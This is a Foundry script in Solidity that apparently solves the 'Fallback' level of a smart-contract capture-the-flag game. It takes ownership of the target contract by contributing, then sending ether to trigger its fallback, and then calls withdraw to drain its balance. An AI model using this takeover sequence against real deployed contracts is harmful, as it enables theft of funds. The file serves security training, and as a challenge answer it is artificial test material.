// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

import "forge-std/console.sol";

import {Level1Fallback} from "../src/Level1Fallback.sol";

contract Level1FallbackSolution is Script {
    Level1Fallback public level1Fallback = Level1Fallback(payable(0x27CB7B647717Ccb816cfc8CCeD54763C6f2A380c));

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        level1Fallback.getContribution();

        console.log("The owner was", level1Fallback.owner());

        level1Fallback.contribute{value: 0.0001 ether}();

        (bool ok,) = address(level1Fallback).call{value: 0.0001 ether}("");
        require(ok, "ETH send failed");

        console.log("The owner is:", level1Fallback.owner());

        level1Fallback.withdraw();

        vm.stopBroadcast();
    }
}
